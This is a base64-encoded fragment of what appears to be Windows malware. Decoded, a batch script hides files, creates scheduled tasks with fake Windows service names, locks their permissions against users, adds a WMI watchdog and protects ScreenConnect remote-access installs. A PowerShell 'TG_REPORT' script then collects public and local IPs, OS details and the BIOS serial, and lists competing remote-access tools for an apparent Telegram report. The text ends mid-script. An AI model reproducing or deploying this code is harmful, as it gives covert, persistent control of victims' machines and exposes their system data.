bXV0YWJsZSBwYXlsb2FkIHNjcmlwdHMgLSBjb3B5L21vdmUgb3ZlciAraCArcyBmaWxlcw0KUkVN
IGZhaWxzIHNpbGVudGx5IGFuZCBmcm96ZSB0aGUgd2hvbGUgZmxlZXQncyBzZWxmLXVwZGF0ZS4g
SGlkZGVuIGRpcnMgY29uY2VhbCBjb250ZW50cyBhbHJlYWR5Lg0KZm9yICUlRiBpbiAocGtnLm1z
aSBub3RpZnkuY2ZnIGlkZW50aXR5LmNmZyBzdGF0ZS5qc29uKSBkbyAoDQogIGlmIGV4aXN0ICIl
V0QlXCUlRiIgYXR0cmliICtoICtzICIlV0QlXCUlRiIgPm51bCAyPiYxDQopDQoNClJFTSAtLS0g
QUNMOiBzY2hlZHVsZWQgdGFzayBYTUwgKGhhcmRlciB0byBkZWxldGUgd2l0aG91dCBBZG1pbikg
LS0tDQpSRU0gUzY6IG5hbWVzIGNvbnRhaW4gc3BhY2VzICgiU2VydmVyIERpYWdub3N0aWNzIikg
LSB0aGUgY21kIEZPUiBsb29wIHNwbGl0DQpSRU0gdGhlbSBpbnRvIGdhcmJhZ2UgdG9rZW5zLiBQ
b3dlclNoZWxsIHJlYWRzIGlkZW50aXR5LmNmZyBkaXJlY3RseSBpbnN0ZWFkLg0KcG93ZXJzaGVs
bC5leGUgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3Mg
LUNvbW1hbmQgXg0KICAiJEVycm9yQWN0aW9uUHJlZmVyZW5jZT0nU2lsZW50bHlDb250aW51ZSc7
ICRuYW1lcz1AKCk7IiBeDQogICJpZihUZXN0LVBhdGggLUxpdGVyYWxQYXRoICclV0QlXGlkZW50
aXR5LmNmZycpeyBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJyVXRCVcaWRlbnRpdHkuY2ZnJyAt
Rm9yY2UgfCBGb3JFYWNoLU9iamVjdCB7IGlmKCRfIC1tYXRjaCAnXlRBU0tfW0EtRF09KC4rKSQn
KXsgJG5hbWVzICs9ICRtYXRjaGVzWzFdLlRyaW0oKS5UcmltU3RhcnQoJ1wnKSB9IH0gfSIgXg0K
ICAiZWxzZSB7ICRuYW1lcz1AKCdXZXJRdWV1ZVN5bmMnLCdQbGFTZXJ2ZXJIZWFsdGgnLCdXZGlI
b3N0UHJveHknLCdUY3BJcENvbmZsaWN0UmVzJykgfTsiIF4NCiAgImZvcmVhY2goJG4gaW4gJG5h
bWVzKXsgJGYgPSBKb2luLVBhdGggJyVUQVNLUk9PVCUnICRuOyBpZihUZXN0LVBhdGggLUxpdGVy
YWxQYXRoICRmKXsgJiBpY2FjbHMuZXhlICRmIC9pbmhlcml0YW5jZTpyIHwgT3V0LU51bGw7ICYg
aWNhY2xzLmV4ZSAkZiAvZ3JhbnQ6ciAnTlQgQVVUSE9SSVRZXFNZU1RFTTpGJyAnQlVJTFRJTlxB
ZG1pbmlzdHJhdG9yczpGJyB8IE91dC1OdWxsOyAmIGF0dHJpYi5leGUgK2ggK3MgJGYgfCBPdXQt
TnVsbCB9IH0iID5udWwgMj4mMQ0KDQpSRU0gLS0tIEFDTDogV01JIHdhdGNoZG9nIHN1YnNjcmlw
dGlvbiBmaWxlcyAoY2hhaW4gMikgLS0tDQppY2FjbHMgIiVTeXN0ZW1Sb290JVxTeXN0ZW0zMlx3
YmVtXFJlcG9zaXRvcnkiIC9ncmFudCAiTlQgQVVUSE9SSVRZXFNZU1RFTTpGIiA+bnVsIDI+JjEN
Cg0KUkVNIC0tLSBBQ0w6IGtlZXAgU2NyZWVuQ29ubmVjdCBpbnN0YWxsIGRpcnMgKG9uY2U7IHRh
a2Vvd24gZXZlcnkgdGljayBpcyBub2lzeSkgLS0tDQppZiBub3QgZXhpc3QgIiVXRCVcc2VjdXJl
X3NjLmZsYWciICgNCiAgZm9yICUlRCBpbiAoDQogICAgIiVQRiVcU2NyZWVuQ29ubmVjdCBDbGll
bnQgKCVLRUVQMSUpIg0KICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKSIN
CiAgICAiJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAzJSkiDQogICAgIiVQRjg2JVxT
Y3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiDQogICAgIiVQRjg2JVxTY3JlZW5Db25uZWN0
IENsaWVudCAoJUtFRVAyJSkiDQogICAgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtF
RVAzJSkiDQogICkgZG8gKA0KICAgIGlmIGV4aXN0ICIlJX5EIiBjYWxsIDpMb2NrRGlyICIlJX5E
Ig0KICApDQogIGVjaG8gc2NfbG9ja2VkPiVXRCVcc2VjdXJlX3NjLmZsYWcNCikNCg0KUkVNIC0t
LSBTQyBzZXJ2aWNlczogU1lTVEVNIGNhbiBjb25maWcvc3RvcC9kZWxldGU7IEJBIGZ1bGw7IHVz
ZXJzIGJsb2NrZWQgLS0tDQpSRU0gU1k6IENDIERDIExDIFNXIFJQIERUIExPIFJDICAobm8gU0Qg
LT4gY2Fubm90IGNoYW5nZSB0aGlzIFNEIGl0c2VsZikNCnNldCAiU0Q9RDooQTs7Q0NEQ0xDU1dS
UFdQRFRMT0NSUkM7OztTWSkoQTs7Q0NEQ0xDU1dSUFdQRFRMT0NSU0RSQ1dEV087OztCQSkiDQpz
Yy5leGUgc2RzZXQgIiVQUklNJSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlQUxU
JSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlR1JZWEElIiAiJVNEJSIgPm51bCAy
PiYxDQpzYy5leGUgY29uZmlnICIlUFJJTSUiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0Kc2MuZXhl
IGNvbmZpZyAiJUFMVCUiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJUdS
WVhBJSIgc3RhcnQ9IGF1dG8gPm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJVBSSU0lIiByZXNl
dD0gODY0MDAgYWN0aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAw
MDAgPm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJUFMVCUiIHJlc2V0PSA4NjQwMCBhY3Rpb25z
PSByZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMCA+bnVsIDI+JjENCnNj
LmV4ZSBmYWlsdXJlICIlR1JZWEElIiByZXNldD0gODY0MDAgYWN0aW9ucz0gcmVzdGFydC82MDAw
MC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAgPm51bCAyPiYxDQoNCmVjaG8gc2VjdXJlX2Rv
bmU+PiIlTE9HJSINCmV4aXQgL2IgMA0KDQo6TG9ja0Rpcg0Kc2V0ICJUPSV+MSINCmlmIG5vdCBl
eGlzdCAiJVQlIiBleGl0IC9iIDANClJFTSB0YWtlIG93bmVyc2hpcCB0aGVuIHN0cmlwIGluaGVy
aXRlZCBBQ0VzOyBTWVNURU0rQWRtaW5zIG9ubHkNCnRha2Vvd24gL0YgIiVUJSIgL1IgL0QgWSA+
bnVsIDI+JjENCmljYWNscyAiJVQlIiAvaW5oZXJpdGFuY2U6ciA+bnVsIDI+JjENCmljYWNscyAi
JVQlIiAvZ3JhbnQ6ciAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElOXEFk
bWluaXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxDQppY2FjbHMgIiVUJSIgL3JlbW92ZTpn
ICJVc2VycyIgIkF1dGhlbnRpY2F0ZWQgVXNlcnMiICJFdmVyeW9uZSIgIk5UIEFVVEhPUklUWVxJ
TlRFUkFDVElWRSIgIkJVSUxUSU5cVXNlcnMiID5udWwgMj4mMQ0KZXhpdCAvYiAwDQo=
::B64_SEC_END
::B64_TGR_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIFRHX1JFUE9SVCBCVUlMRCAyMDI2MDgwMlQxNSAtIHJv
b3QtbGV2ZWwgdGFzayBuYW1lcyAoSURFTlRWRVI9Nyk7IFRSIG93bmVyc2hpcDsgUk1NK0RhdHRv
IGtlZXAKcGFyYW0oCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV1bc3RyaW5nXSRT
dGF0ZSwKICAgIFtzdHJpbmddJFN1bW1hcnkgPSAnJywKICAgIFtzdHJpbmddJFdvcmtEaXIgPSAn
QzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUnLAogICAg
W3N0cmluZ10kT2xkU3RhdGUgPSAnJywKICAgIFtWYWxpZGF0ZVNldCgncmljaCcsICdjb21wYWN0
JyldW3N0cmluZ10kTW9kZSA9ICdyaWNoJywKICAgIFtzdHJpbmddJEJ1aWxkID0gJ08xNScsCiAg
ICBbc3RyaW5nXSRDb3VudCA9ICcwJwopCgokRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1NpbGVu
dGx5Q29udGludWUnCiRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScKdHJ5
IHsgW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2Vj
dXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMiB9IGNhdGNoIHt9CgpmdW5jdGlvbiBHZXQtQ2ZnIHsK
ICAgICRwYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdub3RpZnkuY2ZnJwogICAgJGNmZyA9IEB7
fQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcGF0aCkpIHsgcmV0dXJuICRjZmcgfQogICAgR2V0
LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRwYXRoIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgIGlm
ICgkXyAtbWF0Y2ggJ15ccyooW0EtWmEtejAtOV9dKylccyo9XHMqKC4qKVxzKiQnKSB7CiAgICAg
ICAgICAgICRjZmdbJG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0uVHJpbSgpCiAgICAgICAgfQog
ICAgfQogICAgcmV0dXJuICRjZmcKfQoKZnVuY3Rpb24gRXNjKFtzdHJpbmddJHMpIHsKICAgIGlm
ICgkbnVsbCAtZXEgJHMpIHsgcmV0dXJuICcnIH0KICAgIHJldHVybiAoJHMgLXJlcGxhY2UgJyYn
LCAnJmFtcDsnIC1yZXBsYWNlICc8JywgJyZsdDsnIC1yZXBsYWNlICc+JywgJyZndDsnKQp9Cgpm
dW5jdGlvbiBHZXQtUHVibGljSXAgewogICAgZm9yZWFjaCAoJHUgaW4gQCgKICAgICAgICAgICAg
J2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZycsCiAgICAgICAgICAgICdodHRwczovL2lmY29uZmlnLm1l
L2lwJywKICAgICAgICAgICAgJ2h0dHBzOi8vaWNhbmhhemlwLmNvbScKICAgICAgICApKSB7CiAg
ICAgICAgdHJ5IHsKICAgICAgICAgICAgJHIgPSBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1IC1V
c2VCYXNpY1BhcnNpbmcgLVRpbWVvdXRTZWMgNgogICAgICAgICAgICAkaXAgPSAoJHIuQ29udGVu
dCB8IE91dC1TdHJpbmcpLlRyaW0oKQogICAgICAgICAgICBpZiAoJGlwIC1tYXRjaCAnXlxkezEs
M30oXC5cZHsxLDN9KXszfSQnIC1vciAkaXAgLW1hdGNoICc6JykgeyByZXR1cm4gJGlwIH0KICAg
ICAgICB9IGNhdGNoIHt9CiAgICB9CiAgICByZXR1cm4gJ24vYScKfQoKZnVuY3Rpb24gR2V0LUxv
Y2FsSXBzIHsKICAgIHRyeSB7CiAgICAgICAgJGlwcyA9IEdldC1OZXRJUEFkZHJlc3MgLUFkZHJl
c3NGYW1pbHkgSVB2NCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAgICAgICAg
IFdoZXJlLU9iamVjdCB7ICRfLklQQWRkcmVzcyAtbm90bGlrZSAnMTI3LionIC1hbmQgJF8uUHJl
Zml4T3JpZ2luIC1uZSAnV2VsbEtub3duJyB9IHwKICAgICAgICAgICAgU2VsZWN0LU9iamVjdCAt
RXhwYW5kUHJvcGVydHkgSVBBZGRyZXNzIC1VbmlxdWUKICAgICAgICBpZiAoJGlwcykgeyByZXR1
cm4gKCRpcHMgLWpvaW4gJywgJykgfQogICAgfSBjYXRjaCB7fQogICAgdHJ5IHsKICAgICAgICAk
aXBzID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX05ldHdvcmtBZGFwdGVyQ29uZmlndXJhdGlvbiAt
RmlsdGVyICdJUEVuYWJsZWQ9VHJ1ZScgfAogICAgICAgICAgICBGb3JFYWNoLU9iamVjdCB7ICRf
LklQQWRkcmVzcyB9IHwgV2hlcmUtT2JqZWN0IHsgJF8gLWFuZCAkXyAtbm90bGlrZSAnMTI3Lion
IC1hbmQgJF8gLW5vdGxpa2UgJyo6KicgfQogICAgICAgIGlmICgkaXBzKSB7IHJldHVybiAoKCRp
cHMgfCBTZWxlY3QtT2JqZWN0IC1VbmlxdWUpIC1qb2luICcsICcpIH0KICAgIH0gY2F0Y2gge30K
ICAgIHJldHVybiAnbi9hJwp9CgpmdW5jdGlvbiBHZXQtT3NJbmZvIHsKICAgICRvID0gW29yZGVy
ZWRdQHsKICAgICAgICBDYXB0aW9uID0gJ24vYSc7IFZlcnNpb24gPSAnbi9hJzsgQnVpbGQgPSAn
bi9hJzsgQXJjaCA9ICduL2EnCiAgICAgICAgRG9tYWluID0gJ24vYSc7IEluc3RhbGxEYXRlID0g
J24vYSc7IExhc3RCb290ID0gJ24vYScKICAgICAgICBDUFUgPSAnbi9hJzsgTWFudWZhY3R1cmVy
ID0gJ24vYSc7IE1vZGVsID0gJ24vYSc7IFNlcmlhbCA9ICduL2EnCiAgICAgICAgVG90YWxSQU1f
R0IgPSAnbi9hJzsgRGlza0ZyZWVfR0IgPSAnbi9hJzsgRGlza1NpemVfR0IgPSAnbi9hJwogICAg
fQogICAgdHJ5IHsKICAgICAgICAkb3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfT3BlcmF0aW5n
U3lzdGVtCiAgICAgICAgJG8uQ2FwdGlvbiA9ICRvcy5DYXB0aW9uCiAgICAgICAgJG8uVmVyc2lv
biA9ICRvcy5WZXJzaW9uCiAgICAgICAgJG8uQnVpbGQgPSAkb3MuQnVpbGROdW1iZXIKICAgICAg
ICAkby5BcmNoID0gJG9zLk9TQXJjaGl0ZWN0dXJlCiAgICAgICAgJG8uSW5zdGFsbERhdGUgPSAo
JG9zLkluc3RhbGxEYXRlIHwgR2V0LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCcpCiAgICAgICAg
JG8uTGFzdEJvb3QgPSAoJG9zLkxhc3RCb290VXBUaW1lIHwgR2V0LURhdGUgLUZvcm1hdCAneXl5
eS1NTS1kZCBISDptbScpCiAgICAgICAgJG8uVG90YWxSQU1fR0IgPSBbbWF0aF06OlJvdW5kKCRv
cy5Ub3RhbFZpc2libGVNZW1vcnlTaXplIC8gMU1CLCAxKQogICAgfSBjYXRjaCB7fQogICAgdHJ5
IHsKICAgICAgICAkY3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfQ29tcHV0ZXJTeXN0ZW0KICAg
ICAgICAkby5Eb21haW4gPSBpZiAoJGNzLlBhcnRPZkRvbWFpbikgeyAkY3MuRG9tYWluIH0gZWxz
ZSB7ICRjcy5Xb3JrZ3JvdXAgfQogICAgICAgICRvLk1hbnVmYWN0dXJlciA9ICRjcy5NYW51ZmFj
dHVyZXIKICAgICAgICAkby5Nb2RlbCA9ICRjcy5Nb2RlbAogICAgfSBjYXRjaCB7fQogICAgdHJ5
IHsKICAgICAgICAkby5DUFUgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3NvciB8IFNl
bGVjdC1PYmplY3QgLUZpcnN0IDEgLUV4cGFuZFByb3BlcnR5IE5hbWUpCiAgICB9IGNhdGNoIHt9
CiAgICB0cnkgewogICAgICAgICRvLlNlcmlhbCA9IChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfQklP
UykuU2VyaWFsTnVtYmVyCiAgICB9IGNhdGNoIHt9CiAgICB0cnkgewogICAgICAgICRkID0gR2V0
LUNpbUluc3RhbmNlIFdpbjMyX0xvZ2ljYWxEaXNrIC1GaWx0ZXIgIkRldmljZUlEPSdDOiciCiAg
ICAgICAgJG8uRGlza0ZyZWVfR0IgPSBbbWF0aF06OlJvdW5kKCRkLkZyZWVTcGFjZSAvIDFHQiwg
MSkKICAgICAgICAkby5EaXNrU2l6ZV9HQiA9IFttYXRoXTo6Um91bmQoJGQuU2l6ZSAvIDFHQiwg
MSkKICAgIH0gY2F0Y2gge30KICAgIHJldHVybiAkbwp9CgpmdW5jdGlvbiBHZXQtU3ZjTGluZShb
c3RyaW5nXSRuYW1lKSB7CiAgICAkcyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFj
dGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJ05PVCBJTlNU
QUxMRUQnIH0KICAgIHJldHVybiAoJ3swfSAoU3RhcnQ9ezF9KScgLWYgJHMuU3RhdHVzLCAkcy5T
dGFydFR5cGUpCn0KCmZ1bmN0aW9uIEdldC1UYXNrSGVhbHRoKFtzdHJpbmddJHRuKSB7CiAgICAk
b3V0ID0gJiBzY2h0YXNrcy5leGUgL1F1ZXJ5IC9UTiAkdG4gL0ZPIExJU1QgL1YgMj4kbnVsbAog
ICAgaWYgKCRMQVNURVhJVENPREUgLW5lIDAgLW9yIC1ub3QgJG91dCkgewogICAgICAgIHJldHVy
biBAeyBQcmVzZW50ID0gJGZhbHNlOyBTdGF0dXMgPSAnTUlTU0lORyc7IE5leHQgPSAnJzsgTGFz
dCA9ICcnOyBSZXN1bHQgPSAnJzsgT3VycyA9ICRmYWxzZSB9CiAgICB9CiAgICAkbWFwID0gQHt9
CiAgICAkYmxvYiA9ICgkb3V0IHwgRm9yRWFjaC1PYmplY3QgeyAiJF8iIH0pIC1qb2luICJgbiIK
ICAgIGZvcmVhY2ggKCRsaW5lIGluICRvdXQpIHsKICAgICAgICBpZiAoJGxpbmUgLW1hdGNoICde
XHMqKFteOl0rKTpccyooLiopXHMqJCcpIHsKICAgICAgICAgICAgJG1hcFskbWF0Y2hlc1sxXS5U
cmltKCldID0gJG1hdGNoZXNbMl0uVHJpbSgpCiAgICAgICAgfQogICAgfQogICAgJHN0YXR1cyA9
ICRtYXBbJ1N0YXR1cyddCiAgICBpZiAoLW5vdCAkc3RhdHVzKSB7ICRzdGF0dXMgPSAkbWFwWydU
YXNrIFN0YXR1cyddIH0KICAgIGlmICgtbm90ICRzdGF0dXMpIHsgJHN0YXR1cyA9ICdwcmVzZW50
JyB9CiAgICAkbmV4dCA9ICRtYXBbJ05leHQgUnVuIFRpbWUnXQogICAgaWYgKC1ub3QgJG5leHQp
IHsgJG5leHQgPSAnJyB9CiAgICAkbGFzdCA9ICRtYXBbJ0xhc3QgUnVuIFRpbWUnXQogICAgaWYg
KC1ub3QgJGxhc3QpIHsgJGxhc3QgPSAnJyB9CiAgICAkcmVzdWx0ID0gJG1hcFsnTGFzdCBSZXN1
bHQnXQogICAgaWYgKC1ub3QgJHJlc3VsdCkgeyAkcmVzdWx0ID0gJycgfQogICAgJHRyID0gJG1h
cFsnVGFzayBUbyBSdW4nXQogICAgaWYgKC1ub3QgJHRyKSB7ICR0ciA9ICRtYXBbJ1Rhc2sgdG8g
UnVuJ10gfQogICAgJG91cnMgPSAoJGJsb2IgLW1hdGNoICcoP2kpb3duX21vblwuY21kfGV0bF9t
b25cLmNtZHxcLnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQogICAgIyBQcmVzZW50IFdpbmRvd3Mg
YnVpbHQtaW4gd2l0aCBzYW1lIG5hbWUgaXMgTk9UIGhlYWx0aHkgZm9yIHVzCiAgICAkaGVhbHRo
eSA9ICRvdXJzIC1hbmQgKCgkc3RhdHVzIC1tYXRjaCAnUmVhZHl8UnVubmluZycpIC1vciAoJHN0
YXR1cyAtZXEgJ3ByZXNlbnQnKSkKICAgIHJldHVybiBAewogICAgICAgIFByZXNlbnQgPSAkdHJ1
ZQogICAgICAgIE91cnMgICAgPSBbYm9vbF0kb3VycwogICAgICAgIEhlYWx0aHkgPSBbYm9vbF0k
aGVhbHRoeQogICAgICAgIFN0YXR1cyAgPSAkKGlmICgkb3VycykgeyAkc3RhdHVzIH0gZWxzZSB7
ICdOT1RfT1VSUycgfSkKICAgICAgICBOZXh0ICAgID0gJG5leHQKICAgICAgICBMYXN0ICAgID0g
JGxhc3QKICAgICAgICBSZXN1bHQgID0gJHJlc3VsdAogICAgICAgIFRyICAgICAgPSAkKGlmICgk
dHIpIHsgJHRyIH0gZWxzZSB7ICcnIH0pCiAgICB9Cn0KCmZ1bmN0aW9uIEdldC1SbW1IaXRzIHsK
ICAgICMgRGV0ZWN0IHJpdmFscyBmb3IgVGVsZWdyYW0uIEtFRVA6IFNjcmVlbkNvbm5lY3QgYWxs
b3dsaXN0ICsgRGF0dG8vQ2VudHJhU3RhZ2UuCiAgICAkdG9rZW5zID0gQCgKICAgICAgICAnQW55
RGVzaycsICdUZWFtVmlld2VyJywgJ3R2bnNlcnZlcicsICdEV0FnZW50JywgJ0RXU2VydmljZScs
ICdMb2dNZUluJywgJ0xNSUd1YXJkaWFuJywKICAgICAgICAnV2luVk5DJywgJ3ZuY3NlcnZlcics
ICd0dl8nLCAnU3BsYXNodG9wJywgJ1pvaG8gQXNzaXN0JywgJ1J1c3REZXNrJywgJ1JlbW90ZVBD
JywgJ0RhbWVXYXJlJywKICAgICAgICAnQXRlcmFBZ2VudCcsICdBdGVyYScsICdOaW5qYVJNTScs
ICdOaW5qYU9uZScsICdOaW5qYVJNTUFnZW50JywgJ0thc2V5YScsICdBZ2VudE1vbicsICdQdWxz
ZXdheScsICdQQyBNb25pdG9yJywgJ1N5bmNybycsICdLYWJ1dG8nLAogICAgICAgICdTdXBlck9w
cycsICdNYW5hZ2VFbmdpbmUnLCAnVUVNUycsICdEZXNrdG9wIENlbnRyYWwnLCAnRW5kcG9pbnQg
Q2VudHJhbCcsICdTb2xhcldpbmRzIE1TUCcsICdDb25uZWN0V2lzZSBBdXRvbWF0ZScsICdMVFNl
cnZpY2UnLCAnTGFiVGVjaCcsCiAgICAgICAgJ0FjdGlvbjEnLCAnU2ltcGxlSGVscCcsICdCb21n
YXInLCAnQmV5b25kVHJ1c3QnLCAnTWVzaEFnZW50JywgJ01lc2ggQ2VudHJhbCcsICdNZXNoIEFn
ZW50JywKICAgICAgICAnVGFjdGljYWxSTU0nLCAndGFjdGljYWxybW0nLCAnR2V0U2NyZWVuJywg
J1N1cHJlbW8nLCAncnV0c2VydicsICdyZW1vdGluZ19ob3N0JywKICAgICAgICAnQ2hyb21lIFJl
bW90ZSBEZXNrdG9wJywgJ1BhcnNlYycsICdOZXRTdXBwb3J0JywgJ0xldmVsLmlvJywgJ0xldmVs
IEFnZW50JywKICAgICAgICAnQ29udGludXVtJywgJ1NBQVonLCAnTmF2ZXJpc2snLCAnSW1teUJv
dCcsICdBdXRvbW94JywgJ2FtYWdlbnQnLCAnQWNyb25pcyBDeWJlcicsICdEb21vdHonLCAnQXV2
aWsnLAogICAgICAgICdCYXJyYWN1ZGEgUk1NJywgJ01hbmFnZWQgV29ya3BsYWNlJywgJ0dvdmVy
bGFuJywgJ1BEUSBEZXBsb3knLCAnUERRIEludmVudG9yeScsICdQRFEgQ29ubmVjdCcsCiAgICAg
ICAgJ04tYWJsZScsICdOLWNlbnRyYWwnLCAnTi1zaWdodCcsICdUYWtlIENvbnRyb2wnLCAnQWR2
YW5jZWQgTW9uaXRvcmluZyBBZ2VudCcsICdVbHRyYVZpZXdlcicsICdBZXJvQWRtaW4nLAogICAg
ICAgICdMaXRlTWFuYWdlcicsICdSYWRtaW4nLCAnTm9NYWNoaW5lJywgJ0lwZXJpdXMnLCAnSVNM
IExpZ2h0JywgJ0FtbXl5JywgJ1RpZ2h0Vk5DJywgJ1VsdHJhVk5DJywgJ1JlYWxWTkMnCiAgICAp
CiAgICAka2VlcFRva2VucyA9IEAoJ0RhdHRvJywgJ0NlbnRyYVN0YWdlJywgJ0NhZ1NlcnZpY2Un
LCAnQXV0b3Rhc2tFbmRwb2ludCcpCiAgICAkaGl0cyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxl
Y3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCiAgICAkc2VlbiA9IEB7fQoKICAgIGZ1bmN0aW9u
IEFkZC1IaXQoW3N0cmluZ10ka2luZCwgW3N0cmluZ10kbmFtZSkgewogICAgICAgICRrZXkgPSAi
JGtpbmR8JG5hbWUiLlRvTG93ZXJJbnZhcmlhbnQoKQogICAgICAgIGlmICgkc2Vlbi5Db250YWlu
c0tleSgka2V5KSkgeyByZXR1cm4gfQogICAgICAgICRzZWVuWyRrZXldID0gJHRydWUKICAgICAg
ICBbdm9pZF0kaGl0cy5BZGQoKCctIFt7MH1dIDxjb2RlPnsxfTwvY29kZT4nIC1mICRraW5kLCAo
RXNjICRuYW1lKSkpCiAgICB9CiAgICBmdW5jdGlvbiBUZXN0LUtlZXBOYW1lKFtzdHJpbmddJHMp
IHsKICAgICAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJGZhbHNlIH0KICAgICAgICBpZiAoJHMg
LWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0dXJuICR0cnVlIH0KICAgICAgICBmb3JlYWNo
ICgkayBpbiAka2VlcFRva2VucykgeyBpZiAoJHMgLWxpa2UgIiokayoiKSB7IHJldHVybiAkdHJ1
ZSB9IH0KICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CgogICAgR2V0LVNlcnZpY2UgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgJG4gPSAk
Xy5OYW1lCiAgICAgICAgJGQgPSAkXy5EaXNwbGF5TmFtZQogICAgICAgIGlmIChUZXN0LUtlZXBO
YW1lICRuIC1vciBUZXN0LUtlZXBOYW1lICRkKSB7CiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAn
KkNlbnRyYVN0YWdlKicgLW9yICRkIC1saWtlICcqRGF0dG8qJyAtb3IgJG4gLWxpa2UgJypDYWdT
ZXJ2aWNlKicpIHsKICAgICAgICAgICAgICAgIEFkZC1IaXQgJ2tlZXAtZGF0dG8nICgiJG4gKCQo
JF8uU3RhdHVzKSkiKQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybgogICAgICAgIH0K
ICAgICAgICBmb3JlYWNoICgkdCBpbiAkdG9rZW5zKSB7CiAgICAgICAgICAgIGlmICgkbiAtbGlr
ZSAiKiR0KiIgLW9yICRkIC1saWtlICIqJHQqIikgewogICAgICAgICAgICAgICAgQWRkLUhpdCAn
c3ZjJyAoIiRuICgkKCRfLlN0YXR1cykpIikKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAg
ICAgIH0KICAgICAgICB9CiAgICB9CgogICAgR2V0LVByb2Nlc3MgLUVycm9yQWN0aW9uIFNpbGVu
dGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgJG4gPSAkXy5Qcm9jZXNzTmFt
ZQogICAgICAgIGlmIChUZXN0LUtlZXBOYW1lICRuKSB7IHJldHVybiB9CiAgICAgICAgZm9yZWFj
aCAoJHQgaW4gJHRva2VucykgewogICAgICAgICAgICBpZiAoJG4gLWxpa2UgIiokdCoiKSB7CiAg
ICAgICAgICAgICAgICBBZGQtSGl0ICdwcm9jJyAkbgogICAgICAgICAgICAgICAgYnJlYWsKICAg
ICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICAkdW5pbnN0ID0gQCgKICAgICAgICAnSEtM
TTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXCon
LAogICAgICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xD
dXJyZW50VmVyc2lvblxVbmluc3RhbGxcKicKICAgICkKICAgIGZvcmVhY2ggKCRwYXRoIGluICR1
bmluc3QpIHsKICAgICAgICBHZXQtSXRlbVByb3BlcnR5ICRwYXRoIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAkZG4gPSAkXy5EaXNw
bGF5TmFtZQogICAgICAgICAgICBpZiAoLW5vdCAkZG4pIHsgcmV0dXJuIH0KICAgICAgICAgICAg
aWYgKFRlc3QtS2VlcE5hbWUgJGRuKSB7CiAgICAgICAgICAgICAgICBpZiAoJGRuIC1saWtlICcq
RGF0dG8qJyAtb3IgJGRuIC1saWtlICcqQ2VudHJhU3RhZ2UqJykgeyBBZGQtSGl0ICdrZWVwLWRh
dHRvJyAkZG4gfQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIH0KICAgICAgICAg
